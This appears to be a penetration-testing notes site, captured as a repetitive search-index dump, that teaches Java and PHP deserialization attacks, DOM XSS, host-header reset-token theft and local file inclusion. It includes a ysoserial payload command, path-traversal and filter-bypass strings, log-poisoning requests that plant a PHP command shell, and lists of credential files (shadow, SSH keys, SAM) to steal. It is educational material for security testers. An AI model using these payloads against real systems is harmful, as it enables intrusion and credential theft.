https://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html So, how to we deserialize it again? Just as writeObject() serializes an object readObject() deserializes the object. String name; String filename = \"file.bin\"; try { FileInputStream file = new FileInputStream(filename); ObjectInputStream out = new ObjectInputStream(file); // Serialization of the \"name\" (String) object // Will be written to \"file.bin\" name = (String)out.readObject(); System.out.println(name); out.close(); file.close(); } catch(Exception e) { System.out.println(\"Exception: \" + e.toString()); } It is not only readObject() that is vulnerable. The following methods are some that also deserializes an object: readResolve readExternal readUnshared XStream So, in order to identify deserialization vulnerabilities we need to identify an entry point, and code snippets/objects that we can manipulate the properties of. Entry point # We can look for the usage of the following class: java.io.ObjectInputStream Or for classes that are serializeable and implekentn the readObject class. Serialized java objects always begin with ac ed in hex, and r00 in base64 objects. Without source code / black box # ac ed is the \"magic number\" for deserialized objects. Check the POST body or other areas for the base64 string r00AB . If it is not base64 encoded, it will looke like something with non-printable characters, and it might include stuff like /java/lang/string and things like that. It might look something like this: \u00ac\u00ed..sr..LogFile\u00d7 You can also look for the following content-type: application/x-java-serialized-object https://blog.netspi.com/java-deserialization-attacks-burp/ Example of vulnerable servers: WEbLogic WebSphere Jboss I JBoss 6.1.0 applikationer s\u00e5 \u00e4r det s\u00e5rbara URL:en /invoker/JMKInvokerServlet . Jenkins Soffid IAM Serialized java objects can be found in HTTP Request parameters, view state or cookies. Exploit # Okay, so you have identified where the application is receiving serialized java objects. As i mentioned before, you will only be able to exploit it if the application is compiled with classes that can cause harm. How will you know that if you are black-box testing? Well, you don't. So you just test every single payload possible. Luckily there are common libraries that have vulnerable classes that are known, so if the target application is compiles with those libraries it is possible to exploit. A common way to produce the exploits is by using the tool ysoserial. It can be found here: https://github.com/frohoff/ysoserial If you want to compile it yourself you just need to download the source-code. apt install maven apt install openjdk-8-jdk mvn clean package -DskipTests Otherwise you can just download the jar-file and hope that it is not tampered with. You generate your payload like this: java -jar ysoserial-0.0.5-all.jar Groovy1 \"touch /tmp/poooooowdn\" > payload.txt You have to check the help section to see what payloads are avaiable. There is a also a burp plugin that will generate and test the payloads. Anyways, I just wanted to explain a little bit about how these payloads actually work. So, the only thing an attacker can control is which object to send, and the properties of that object. PHP deserialization attacks # In order to turn an object into a string in PHP you can use serialize() This can be exmplified like this <?php $the_array = array(\"lorem\", \"ipsum\", \"Dolor\"); $serialized = serialize($the_array); print $serialized; ?> // the following will be printed: a:3:{i:0;s:5:\"lorem\";i:1;s:5:\"ipsum\";i:2;s:5:\"Dolor\"} It is pretty simply to decode: array containing 3 elements a:3 index 0, string with five characters, which are lorem i:0;s:5:lorem etc. Unserialize does the same thing, but the other way around. It takes serialized strings and turn them into objects. $theobject = unserialize('\"a:3:{i:0;s:5:\"lorem\";i:1;s:5:\"ipsum\";i:2;s:5:\"Dolor\"}'); Magic methods # Okay, but let's say that we can send in a serialized object to have it unserialized. What can that even do? How can the code be executed? Enter PHP autoloading. PHP objects/classes can have methods that are automatically executed when the class is initialized. These automatic functions are sometimes called magic method. THe following are examples of some magic methods. Remember that there is not guarantee that a class has these magic methods. But if the class do have it they will automatically execute. So if the class has any of these methods they will be run when the class is initilized, for example by doing: <?php $newinst = new LoggerClass(); //Or when deserializing an object $serializedObj = serialize($newinst); unserialize($serialized) __construct() __destruct() __call() __callStatic() __get() __set() __isset() __unset() __sleep() __wakeup() __toString() __invoke() __set_state() __clone() __autoload(). The most common methods are __construct , __destruct , __wakeup However, there are many more. When you run unserialize() the object is instatiated. It is the same as running new class() . So, in orderto exploit the vulnerability, we need the following requirements: The application must recieve a serialized object somewhere from the user. From a GET or POST parameter for example, or in a Cookie. The PHP file where the unserialize-function is executed must contain a useful class, or import a class that is useful. The useful class must contain a magic function that perform the useful action, such as writing to disk. A common magic method is destruct. It is run when the obejct is terminated. A common usage for it, is to be used to store cache files on disk, or stuff like that. Or perform shutdown queries to a database for example. __destruct() Exploit # Exploiting PHP serialization attacks is quite difficult if you don't have access to the source code, because you don't know what classes are available. In order to exploit a PHP deserialization attack the following requirements are necessary: The application must unserialize data that can be controlled by the attacker. The application must have a class which implements the PHP magic methods __wakeup or __destruct . Or any other magic method. The class with the magic method needs to be included in the file where the unserialize is happening. The class must do something that can be of interest to the attacker, such as writing to disk, so you can upload a shell. Step 1 - find unserialize # Burp will look for strings that might be serialized. So check your passive scanner in burp, it says something like \"Serialized object in HTTP message\". Check for strings that look like this: s:1:\u201ds\u201d;s:13:\u201dHi this test \u201c; However, it is more likely that the serialized object is actually base64-encoded, so decode all base64-encoded data you find. With source-code: If you check the source-code looks for: unserialize() If you see that function in the source-code, look to see if user-controlled data is sent to the unserialize() function. Just search all the source files for unserialize , in wordpress it may also be called maybe_unserialize . Now, you also need to find out if the input parameter to unserialize can be controlled by the attacker. Find out where it comes from. Step 2 - Find a class to abuse # Okay, so you have found a point where attacker-controlled data is sent to unserialize() . Now we need to find a class that is: - A. Contains a magic function. - B. Performs an action that is desirable to the attacker (such as writing to disk) - C. Available to use - D. Build payload So in what end do we start? We can start in different ends, either by searching the source-code for magic functions, or search the source-code for useful functions and hope that they are executed from a magic function. A. Contains a magic function Maybe start looking through the source-code for functions like: __construct __destruct __wakeup B. Performs an action that is desirable to the attacker When you have identified a class containing a magic function you need to see if the magic function performs an action that is desirable to the attacker. Remember that the attacker can controll all properties in the class. A common function to be abused is for a class to write error messages to log files. The file_put_contents -function could be in another function that is called from __destruct . An example of such a class would be the following: <?php class Logger(){ $stringLogfile; $stringLogtext; public function __destruct() { file_put_contents($stringLogfile, $stringLogtext, FILE_APPEND); } } ?> Remember that what is a desirable function may vary, of course it would be great to write to files or execute commands. But it could be any other type of action, such as deleting a file, or writing to a database. Or making a request somewhere. But here are some well known desirable functions to search for: File Access: file_put_contents() file_get_contents() unlink() Command execution: exec() passthru() popen() system() C. Available to use Now we have identified a class which contains a Magic function that performs an action that is desirable to us, now we only need to make sure that is is available to us. This will require you to go from the source-file where the unserialize-function is executed backwards to see if the usable class is included. Remember that classes are included recursivly. So if your source-file your have: <?php //My vulnerable class include_once(\"someotherclass.php\") unserialize($COOKIE->\"USER\") ?> You need to check out someotherclass.php <?php //someotherclass.php require(\"moreclasses.php\") include_once(\"evenmoreclasses.php\") ?> <?php //moreclasses.php ?> If you don't feel like doing this type of analysis, you can just hope that all files are included, something which is not uncommon, and just run your exploit and hope for the best. D. Build payload It is a tedious work to actaully build the serialized string by hand. So a better way is to have PHP do it. Just copy the entire class, edit the properties that you need to use, serialize it and then base64-encode it, if that is required. If you get errors when you serialize the class it might be because the code is referencing other classes, you can sometimes fix this simply by removing that code. Here is an example of a class, and how to produce a serialized object of it. REMEBER to URL encode the payload before you send it, or base64-encode it if that is required: // testfil.php <?php class JustTesting { var $file = \"/path/to/file.php\"; public function __destruct(){ echo file_get_contents($this->file, TRUE); } } $newTest = new JustTesting(); echo serialize($newTest); ?> apt install php-cli php -f testfil.php Now you just copy the payload and send it in. Blackbox # So, as an attacker you can't know what classes are included, what classes are available to you. However, if the application is built using framework. Such as composer, composer will include all all composer libraries. So you might find a class from any of those libraries. See this: https://insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf","title":"Deserialization Attacks"},{"location":"attacking_web_applications/deserialization_attacks/#java-deserialization-attacks","text":"Anything can be serialized, it doesn't have to be an object. It can be a string, boolean, function, etc. The difficuly of exploiting deserialization bugs is that you can never introduce code. You will only be able to control the properties of already existing objects. That is why it is called POP-gadget, property-oriented-programming. This difficuly is in part overcome due to the fact that many applications load in libraries where useful classes exist. That is what ysoserial does. It just creates payloads that can be used if a specific library exists, and then you just test all of them. It is kind of a shot gun approach. So, unles you have access to the source code your best bet is probably to just use the shotgun approach and send in all ysoserial payloads, and hope that the application has included one of ysoserial third-party libraries. However, it should be noted that testing all payloads might lead to an unhandled exception and the application might crash. So there is always that risk involved. The ysoserial payloads are blind payloads, and not command output is returned.","title":"Java deserialization attacks"},{"location":"attacking_web_applications/deserialization_attacks/#identify","text":"","title":"Identify"},{"location":"attacking_web_applications/deserialization_attacks/#with-the-source-code-white-box","text":"In source code: You can check the source code to find out if a vulnerable library is being used. The functions to serialize or unserialize in Java is Here is an example, where we serialize the string \"name\", and write the output to a file called file.bin. The function that actually serialize the object is out.writeObject(name) import java.io.*; public class Serial { public static void main(String[] args) { String name = \"Nytro\"; String filename = \"file.bin\"; try { FileOutputStream file = new FileOutputStream(filename); ObjectOutputStream out = new ObjectOutputStream(file); // Serialization of the \"name\" (String) object // Will be written to \"file.bin\" out.writeObject(name); //Here is the serialization. The serialized object is written to the file file.bin out.close(); file.close(); } catch(Exception e) { System.out.println(\"Exception: \" + e.toString()); } } } The result of the code is that the object is written to a file, if we look at the content of that file it shows us the following: AC ED 00 05 74 00 05 4e 79 74 72 6f ....t..Nytro This is just like a a PHP serilaized object, but the \"syntaxt\" to read it is a bit more difficult, because it is binary and not only ASCII as in PHP. Data starts with the binary \"AC ED\" - this is the \"magic number\" that identifies serialized data, so all serialized data will start with this value Serialization protocol version \"00 05\" We only have a String identified by \"74\" Followed by the length of the string \"00 05\" And, finally, our string For more documentation on the protocol on serialized objects see: https://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html So, how to we deserialize it again? Just as writeObject() serializes an object readObject() deserializes the object. String name; String filename = \"file.bin\"; try { FileInputStream file = new FileInputStream(filename); ObjectInputStream out = new ObjectInputStream(file); // Serialization of the \"name\" (String) object // Will be written to \"file.bin\" name = (String)out.readObject(); System.out.println(name); out.close(); file.close(); } catch(Exception e) { System.out.println(\"Exception: \" + e.toString()); } It is not only readObject() that is vulnerable. The following methods are some that also deserializes an object: readResolve readExternal readUnshared XStream So, in order to identify deserialization vulnerabilities we need to identify an entry point, and code snippets/objects that we can manipulate the properties of.","title":"WIth the source code / white-box"},{"location":"attacking_web_applications/deserialization_attacks/#entry-point","text":"We can look for the usage of the following class: java.io.ObjectInputStream Or for classes that are serializeable and implekentn the readObject class. Serialized java objects always begin with ac ed in hex, and r00 in base64 objects.","title":"Entry point"},{"location":"attacking_web_applications/deserialization_attacks/#without-source-code-black-box","text":"ac ed is the \"magic number\" for deserialized objects. Check the POST body or other areas for the base64 string r00AB . If it is not base64 encoded, it will looke like something with non-printable characters, and it might include stuff like /java/lang/string and things like that. It might look something like this: \u00ac\u00ed..sr..LogFile\u00d7 You can also look for the following content-type: application/x-java-serialized-object https://blog.netspi.com/java-deserialization-attacks-burp/ Example of vulnerable servers: WEbLogic WebSphere Jboss I JBoss 6.1.0 applikationer s\u00e5 \u00e4r det s\u00e5rbara URL:en /invoker/JMKInvokerServlet . Jenkins Soffid IAM Serialized java objects can be found in HTTP Request parameters, view state or cookies.","title":"Without source code / black box"},{"location":"attacking_web_applications/deserialization_attacks/#exploit","text":"Okay, so you have identified where the application is receiving serialized java objects. As i mentioned before, you will only be able to exploit it if the application is compiled with classes that can cause harm. How will you know that if you are black-box testing? Well, you don't. So you just test every single payload possible. Luckily there are common libraries that have vulnerable classes that are known, so if the target application is compiles with those libraries it is possible to exploit. A common way to produce the exploits is by using the tool ysoserial. It can be found here: https://github.com/frohoff/ysoserial If you want to compile it yourself you just need to download the source-code. apt install maven apt install openjdk-8-jdk mvn clean package -DskipTests Otherwise you can just download the jar-file and hope that it is not tampered with. You generate your payload like this: java -jar ysoserial-0.0.5-all.jar Groovy1 \"touch /tmp/poooooowdn\" > payload.txt You have to check the help section to see what payloads are avaiable. There is a also a burp plugin that will generate and test the payloads. Anyways, I just wanted to explain a little bit about how these payloads actually work. So, the only thing an attacker can control is which object to send, and the properties of that object.","title":"Exploit"},{"location":"attacking_web_applications/deserialization_attacks/#php-deserialization-attacks","text":"In order to turn an object into a string in PHP you can use serialize() This can be exmplified like this <?php $the_array = array(\"lorem\", \"ipsum\", \"Dolor\"); $serialized = serialize($the_array); print $serialized; ?> // the following will be printed: a:3:{i:0;s:5:\"lorem\";i:1;s:5:\"ipsum\";i:2;s:5:\"Dolor\"} It is pretty simply to decode: array containing 3 elements a:3 index 0, string with five characters, which are lorem i:0;s:5:lorem etc. Unserialize does the same thing, but the other way around. It takes serialized strings and turn them into objects. $theobject = unserialize('\"a:3:{i:0;s:5:\"lorem\";i:1;s:5:\"ipsum\";i:2;s:5:\"Dolor\"}');","title":"PHP deserialization attacks"},{"location":"attacking_web_applications/deserialization_attacks/#magic-methods","text":"Okay, but let's say that we can send in a serialized object to have it unserialized. What can that even do? How can the code be executed? Enter PHP autoloading. PHP objects/classes can have methods that are automatically executed when the class is initialized. These automatic functions are sometimes called magic method. THe following are examples of some magic methods. Remember that there is not guarantee that a class has these magic methods. But if the class do have it they will automatically execute. So if the class has any of these methods they will be run when the class is initilized, for example by doing: <?php $newinst = new LoggerClass(); //Or when deserializing an object $serializedObj = serialize($newinst); unserialize($serialized) __construct() __destruct() __call() __callStatic() __get() __set() __isset() __unset() __sleep() __wakeup() __toString() __invoke() __set_state() __clone() __autoload(). The most common methods are __construct , __destruct , __wakeup However, there are many more. When you run unserialize() the object is instatiated. It is the same as running new class() . So, in orderto exploit the vulnerability, we need the following requirements: The application must recieve a serialized object somewhere from the user. From a GET or POST parameter for example, or in a Cookie. The PHP file where the unserialize-function is executed must contain a useful class, or import a class that is useful. The useful class must contain a magic function that perform the useful action, such as writing to disk. A common magic method is destruct. It is run when the obejct is terminated. A common usage for it, is to be used to store cache files on disk, or stuff like that. Or perform shutdown queries to a database for example. __destruct()","title":"Magic methods"},{"location":"attacking_web_applications/deserialization_attacks/#exploit_1","text":"Exploiting PHP serialization attacks is quite difficult if you don't have access to the source code, because you don't know what classes are available. In order to exploit a PHP deserialization attack the following requirements are necessary: The application must unserialize data that can be controlled by the attacker. The application must have a class which implements the PHP magic methods __wakeup or __destruct . Or any other magic method. The class with the magic method needs to be included in the file where the unserialize is happening. The class must do something that can be of interest to the attacker, such as writing to disk, so you can upload a shell.","title":"Exploit"},{"location":"attacking_web_applications/deserialization_attacks/#step-1-find-unserialize","text":"Burp will look for strings that might be serialized. So check your passive scanner in burp, it says something like \"Serialized object in HTTP message\". Check for strings that look like this: s:1:\u201ds\u201d;s:13:\u201dHi this test \u201c; However, it is more likely that the serialized object is actually base64-encoded, so decode all base64-encoded data you find. With source-code: If you check the source-code looks for: unserialize() If you see that function in the source-code, look to see if user-controlled data is sent to the unserialize() function. Just search all the source files for unserialize , in wordpress it may also be called maybe_unserialize . Now, you also need to find out if the input parameter to unserialize can be controlled by the attacker. Find out where it comes from.","title":"Step 1 - find unserialize"},{"location":"attacking_web_applications/deserialization_attacks/#step-2-find-a-class-to-abuse","text":"Okay, so you have found a point where attacker-controlled data is sent to unserialize() . Now we need to find a class that is: - A. Contains a magic function. - B. Performs an action that is desirable to the attacker (such as writing to disk) - C. Available to use - D. Build payload So in what end do we start? We can start in different ends, either by searching the source-code for magic functions, or search the source-code for useful functions and hope that they are executed from a magic function. A. Contains a magic function Maybe start looking through the source-code for functions like: __construct __destruct __wakeup B. Performs an action that is desirable to the attacker When you have identified a class containing a magic function you need to see if the magic function performs an action that is desirable to the attacker. Remember that the attacker can controll all properties in the class. A common function to be abused is for a class to write error messages to log files. The file_put_contents -function could be in another function that is called from __destruct . An example of such a class would be the following: <?php class Logger(){ $stringLogfile; $stringLogtext; public function __destruct() { file_put_contents($stringLogfile, $stringLogtext, FILE_APPEND); } } ?> Remember that what is a desirable function may vary, of course it would be great to write to files or execute commands. But it could be any other type of action, such as deleting a file, or writing to a database. Or making a request somewhere. But here are some well known desirable functions to search for: File Access: file_put_contents() file_get_contents() unlink() Command execution: exec() passthru() popen() system() C. Available to use Now we have identified a class which contains a Magic function that performs an action that is desirable to us, now we only need to make sure that is is available to us. This will require you to go from the source-file where the unserialize-function is executed backwards to see if the usable class is included. Remember that classes are included recursivly. So if your source-file your have: <?php //My vulnerable class include_once(\"someotherclass.php\") unserialize($COOKIE->\"USER\") ?> You need to check out someotherclass.php <?php //someotherclass.php require(\"moreclasses.php\") include_once(\"evenmoreclasses.php\") ?> <?php //moreclasses.php ?> If you don't feel like doing this type of analysis, you can just hope that all files are included, something which is not uncommon, and just run your exploit and hope for the best. D. Build payload It is a tedious work to actaully build the serialized string by hand. So a better way is to have PHP do it. Just copy the entire class, edit the properties that you need to use, serialize it and then base64-encode it, if that is required. If you get errors when you serialize the class it might be because the code is referencing other classes, you can sometimes fix this simply by removing that code. Here is an example of a class, and how to produce a serialized object of it. REMEBER to URL encode the payload before you send it, or base64-encode it if that is required: // testfil.php <?php class JustTesting { var $file = \"/path/to/file.php\"; public function __destruct(){ echo file_get_contents($this->file, TRUE); } } $newTest = new JustTesting(); echo serialize($newTest); ?> apt install php-cli php -f testfil.php Now you just copy the payload and send it in.","title":"Step 2 - Find a class to abuse"},{"location":"attacking_web_applications/deserialization_attacks/#blackbox","text":"So, as an attacker you can't know what classes are included, what classes are available to you. However, if the application is built using framework. Such as composer, composer will include all all composer libraries. So you might find a class from any of those libraries. See this: https://insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf","title":"Blackbox"},{"location":"attacking_web_applications/dom_based_xss/","text":"DOM-based XSS # In DOM-based XSS the malicious code is never sent to the server. The injection-point is somewhere where javascript has access. The typical example of how this works is with URLs. The user is able to control the URL with the help of the hash-symbol # . If we add that symbol to a URL the browser will not include that characters that comes after it in the requet to the server. https://example.com/#this_is_not_sent_to_server However, the complete URL is included in DOM-objects. document.URL # will generate this output: https://example.com/#this_is_not_sent_to_server Source # So in order to inject and execute a DOM-based XSS we need a injection-point (called source) and a point of execution (called sink). In the example above document.URL is our source. Example of other sources are: document.URL document.documentURI document.URLUnencoded (IE 5.5 or later Only) document.baseURI location location.href location.search location.hash location.pathname window.name document.referrer Sinks # eval setTimeout setInterval setImmediate execScript crypto.generateCRMFRequest ScriptElement.src ScriptElement.text ScriptElement.textContent ScriptElement.innerText anyTag.onEventName Finding it # To find DOM-based XSS you will need to check out the code. If the javascript code is bundled and minified you can use js_beautify to make it readble again. sudo apt-get install libjavascript-beautifier-perl # then invoke js_beautify References # https://github.com/wisec/domxsswiki/wiki/location,-documentURI-and-URL-sources","title":"DOM XSS"},{"location":"attacking_web_applications/dom_based_xss/#dom-based-xss","text":"In DOM-based XSS the malicious code is never sent to the server. The injection-point is somewhere where javascript has access. The typical example of how this works is with URLs. The user is able to control the URL with the help of the hash-symbol # . If we add that symbol to a URL the browser will not include that characters that comes after it in the requet to the server. https://example.com/#this_is_not_sent_to_server However, the complete URL is included in DOM-objects. document.URL # will generate this output: https://example.com/#this_is_not_sent_to_server","title":"DOM-based XSS"},{"location":"attacking_web_applications/dom_based_xss/#source","text":"So in order to inject and execute a DOM-based XSS we need a injection-point (called source) and a point of execution (called sink). In the example above document.URL is our source. Example of other sources are: document.URL document.documentURI document.URLUnencoded (IE 5.5 or later Only) document.baseURI location location.href location.search location.hash location.pathname window.name document.referrer","title":"Source"},{"location":"attacking_web_applications/dom_based_xss/#sinks","text":"eval setTimeout setInterval setImmediate execScript crypto.generateCRMFRequest ScriptElement.src ScriptElement.text ScriptElement.textContent ScriptElement.innerText anyTag.onEventName","title":"Sinks"},{"location":"attacking_web_applications/dom_based_xss/#finding-it","text":"To find DOM-based XSS you will need to check out the code. If the javascript code is bundled and minified you can use js_beautify to make it readble again. sudo apt-get install libjavascript-beautifier-perl # then invoke js_beautify","title":"Finding it"},{"location":"attacking_web_applications/dom_based_xss/#references","text":"https://github.com/wisec/domxsswiki/wiki/location,-documentURI-and-URL-sources","title":"References"},{"location":"attacking_web_applications/host-header-attack/","text":"Host Header Attack # It is common for a web-server to host several applications. These applications are distinguished based on the domain-name. So how would a web server know which page the a user wants to visit? The answer is the host-header. In the host header the domain-name is specified. Password reset # The host-header ca sometimes be parsed in the code and used for creating links. So if the host-header is used for creating the password reset link it is possible for an attacker to steal the reset-token. The attacker just needs to enter the victims email-address in the password reset field, then intercept the request and change the host-header to some address that the attacker controls. When the victim recieves the password reset link they will click on it, which will direct the link to the attackers site, which enables the attacker to steal the reset token, since it will be stored in the url that the user clicks. Web Cache Poisining #","title":"Host-header Attacks"},{"location":"attacking_web_applications/host-header-attack/#host-header-attack","text":"It is common for a web-server to host several applications. These applications are distinguished based on the domain-name. So how would a web server know which page the a user wants to visit? The answer is the host-header. In the host header the domain-name is specified.","title":"Host Header Attack"},{"location":"attacking_web_applications/host-header-attack/#password-reset","text":"The host-header ca sometimes be parsed in the code and used for creating links. So if the host-header is used for creating the password reset link it is possible for an attacker to steal the reset-token. The attacker just needs to enter the victims email-address in the password reset field, then intercept the request and change the host-header to some address that the attacker controls. When the victim recieves the password reset link they will click on it, which will direct the link to the attackers site, which enables the attacker to steal the reset token, since it will be stored in the url that the user clicks.","title":"Password reset"},{"location":"attacking_web_applications/host-header-attack/#web-cache-poisining","text":"","title":"Web Cache Poisining"},{"location":"attacking_web_applications/local_file_inclusion/","text":"Local File Inclusion (LFI) # Local file inclusion means unauthorized access to files on the system. This vulnerability lets the attacker gain access to sensitive files on the server, and it might also lead to gaining a shell. How does it work? # The vulnerability stems from unsanitized user-input. LFI is particularly common in php-sites. Here is an example of php-code vulnerable to LFI. As you can see we just pass in the url-parameter into the require-function without any sanitization. So the user can just add the path to any file. $file = $_GET['page']; require($file); In this example the user could just enter this string and retrieve the /etc/passwd file. http://example.com/page=../../../../../../etc/passwd Bypassing the added .php and other extra file-endings # It is common to add the file-extension through the php-code. Here is how this would look like: $file = $_GET['page']; require($file . \".php\"); The php is added to the filename, this will mean that we will not be able to find the files we are looking for. Since the file /etc/passwd.php does not exist. However, if we add the nullbyte to the end of our attack-string the .php will not be taken into account. So we add %00 to the end of our attack-string. http://example.com/page=../../../../../../etc/passwd%00 This technique is usually called the nullbyte technique since %00 is the nullbyte. The technique only works in versions below php 5.3. So look out for that. Another way to deal with this problem is just to add a question mark to your attack-string. This way the stuff after gets interpreted as a parameter and therefore excluded. Here is an example: http://example.com/page=../../../../../../etc/passwd? Bypassing php-execution # So if you have an LFI you can easily read .txt -files but not .php files. That is because they get executed by the webserver, since their file-ending says that it contains code. This can be bypassed by using a build-in php-filter. http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index Here you use a php-filter to convert it all into base64. So in return you get the whole page base64 encoded. Now you only need to decode it. Save the base64-text into a file and then run: base64 -d savefile.php Linux # Tricks # Download config-files in a nice style-format If you read files straight in the browser the styling can becomes unbearable. Really difficult to read. A way around it is to download the files from the terminal. But that won't work if there is a login that is blocking it. So this is a great workaround: # First we save the cookie curl -s http://example.com/login.php -c cookiefile -d \"user=admin&pass=admin\" curl -s http://example.com/gallery.php?page=/etc/passwd -b cookiefile Sensitive file # This is the default layout of important apache files. https://wiki.apache.org/httpd/DistrosDefaultLayout /etc/issue (A message or system identification to be printed before the login prompt.) /etc/motd (Message of the day banner content. Can contain information about the system owners or use of the system.) /etc/passwd /etc/group /etc/resolv.conf (might be better than /etc/passwd for triggering IDS sigs) /etc/shadow /home/[USERNAME]/.bash_history or .profile ~/.bash_history or .profile $USER/.bash_history or .profile /root/.bash_history or .profile Comes from here: https://gist.github.com/sckalath/a8fd4e754a72015aa0b8 /etc/mtab /etc/inetd.conf /var/log/dmessage Web server files # Usually found in the root of the website .htaccess config.php SSH authorized_keys id_rsa id_rsa.keystore id_rsa.pub known_hosts Logs /etc/httpd/logs/acces_log /etc/httpd/logs/error_log /var/www/logs/access_log /var/www/logs/access.log /usr/local/apache/logs/access_ log /usr/local/apache/logs/access. log /var/log/apache/access_log /var/log/apache2/access_log /var/log/apache/access.log /var/log/apache2/access.log /var/log/access_log User specific files Found in the home-directory .bash_history .mysql_history .my.cnf Proc files \"Under Linux, /proc includes a directory for each running process, including kernel processes, in directories named /proc/PID, where PID is the process number. Each directory contains information about one process, including: /proc/PID/cmdline, the command that originally started the process.\" https://en.wikipedia.org/wiki/Procfs https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/ /proc/sched_debug # Can be used to see what processes the machine is running /proc/mounts /proc/net/arp /proc/net/route /proc/net/tcp /proc/net/udp /proc/net/fib_trie /proc/version /proc/self/environ Bruteforcing SSH known_hosts # https://blog.rootshell.be/2010/11/03/bruteforcing-ssh-known_hosts-files/ LFI to shell # Under the right circumstances you might be able to get a shell from a LFI Log poisoning # There are some requirements. We need to be able to read log files. In this example we are going to poison the apache log file. You can use either the success.log or the error.log So once you have found a LFI vuln you have to inject php-code into the log file and then execute it. Insert php-code into the log file This can be done with nc or telnet. nc 192.168.1.102 80 GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1 Host: 192.168.1.102 Connection: close You can also add it to the error-log by making a request to a page that doesn't exists nc 192.168.1.102 80 GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1 Host: 192.168.1.102 Connection: close Or in the referer parameter. GET / HTTP/1.1 Referer: <? passthru($_GET[cmd]) ?> Host: 192.168.1.159 Connection: close Execute it in the browser Now you can request the log-file through the LFI and see the php-code get executed. http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id Proc files # If you can read the proc-files on the system you might be able to poison them through the user-agent. We can also inject code into /proc/self/environ through the user-agent https://www.exploit-db.com/papers/12992/ https://www.youtube.com/watch?v=ttTVNcPnsJY Windows # Fingerprinting c:\\WINDOWS\\system32\\eula.txt c:\\boot.ini c:\\WINDOWS\\win.ini c:\\WINNT\\win.ini c:\\WINDOWS\\Repair\\SAM c:\\WINDOWS\\php.ini c:\\WINNT\\php.ini c:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf c:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.conf c:\\Program Files\\xampp\\apache\\conf\\httpd.conf c:\\php\\php.ini c:\\php5\\php.ini c:\\php4\\php.ini c:\\apache\\php\\php.ini c:\\xampp\\apache\\bin\\php.ini c:\\home2\\bin\\stable\\apache\\php.ini c:\\home\\bin\\stable\\apache\\php.ini Logs Common path for apache log files on windows: c:\\Program Files\\Apache Group\\Apache\\logs\\access.log c:\\Program Files\\Apache Group\\Apache\\logs\\error.log PHP Session Locations c:\\WINDOWS\\TEMP\\ c:\\php\\sessions\\ c:\\php5\\sessions\\ c:\\php4\\sessions\\ Retrieving password hashes In order to retrieve the systems password hashed we need two files: system and SAM . Once you have those two files you can extract the hased using the kali tool pwdump, like this: pwdump systemfile samfile The system and SAM files can be found in different locations, so try them all. From a webserver the path might be case-sensitive, even though it is windows. So consider that! Systemroot is usually windows windows\\repair\\SAM %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM %SYSTEMROOT%\\System32\\config\\SAM %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\SYSTEM %SYSTEMROOT%\\System32\\config\\RegBack\\system References: # This is the definitive guide to Local File inclusion https://highon.coffee/blog/lfi-cheat-sheet/ And this http://securityidiots.com/Web-Pentest/LFI And this: https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/ https://nets.ec/File_Inclusion https://gist.github.com/sckalath/da1a232f362a700ab459","title":"Local File Inclusion"},{"location":"attacking_web_applications/local_file_inclusion/#local-file-inclusion-lfi","text":"Local file inclusion means unauthorized access to files on the system. This vulnerability lets the attacker gain access to sensitive files on the server, and it might also lead to gaining a shell.","title":"Local File Inclusion (LFI)"},{"location":"attacking_web_applications/local_file_inclusion/#how-does-it-work","text":"The vulnerability stems from unsanitized user-input. LFI is particularly common in php-sites. Here is an example of php-code vulnerable to LFI. As you can see we just pass in the url-parameter into the require-function without any sanitization. So the user can just add the path to any file. $file = $_GET['page']; require($file); In this example the user could just enter this string and retrieve the /etc/passwd file. http://example.com/page=../../../../../../etc/passwd","title":"How does it work?"},{"location":"attacking_web_applications/local_file_inclusion/#bypassing-the-added-php-and-other-extra-file-endings","text":"It is common to add the file-extension through the php-code. Here is how this would look like: $file = $_GET['page']; require($file . \".php\"); The php is added to the filename, this will mean that we will not be able to find the files we are looking for. Since the file /etc/passwd.php does not exist. However, if we add the nullbyte to the end of our attack-string the .php will not be taken into account. So we add %00 to the end of our attack-string. http://example.com/page=../../../../../../etc/passwd%00 This technique is usually called the nullbyte technique since %00 is the nullbyte. The technique only works in versions below php 5.3. So look out for that. Another way to deal with this problem is just to add a question mark to your attack-string. This way the stuff after gets interpreted as a parameter and therefore excluded. Here is an example: http://example.com/page=../../../../../../etc/passwd?","title":"Bypassing the added .php and other extra file-endings"},{"location":"attacking_web_applications/local_file_inclusion/#bypassing-php-execution","text":"So if you have an LFI you can easily read .txt -files but not .php files. That is because they get executed by the webserver, since their file-ending says that it contains code. This can be bypassed by using a build-in php-filter. http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index Here you use a php-filter to convert it all into base64. So in return you get the whole page base64 encoded. Now you only need to decode it. Save the base64-text into a file and then run: base64 -d savefile.php","title":"Bypassing php-execution"},{"location":"attacking_web_applications/local_file_inclusion/#linux","text":"","title":"Linux"},{"location":"attacking_web_applications/local_file_inclusion/#tricks","text":"Download config-files in a nice style-format If you read files straight in the browser the styling can becomes unbearable. Really difficult to read. A way around it is to download the files from the terminal. But that won't work if there is a login that is blocking it. So this is a great workaround: # First we save the cookie curl -s http://example.com/login.php -c cookiefile -d \"user=admin&pass=admin\" curl -s http://example.com/gallery.php?page=/etc/passwd -b cookiefile","title":"Tricks"},{"location":"attacking_web_applications/local_file_inclusion/#sensitive-file","text":"This is the default layout of important apache files. https://wiki.apache.org/httpd/DistrosDefaultLayout /etc/issue (A message or system identification to be printed before the login prompt.) /etc/motd (Message of the day banner content. Can contain information about the system owners or use of the system.) /etc/passwd /etc/group /etc/resolv.conf (might be better than /etc/passwd for triggering IDS sigs) /etc/shadow /home/[USERNAME]/.bash_history or .profile ~/.bash_history or .profile $USER/.bash_history or .profile /root/.bash_history or .profile Comes from here: 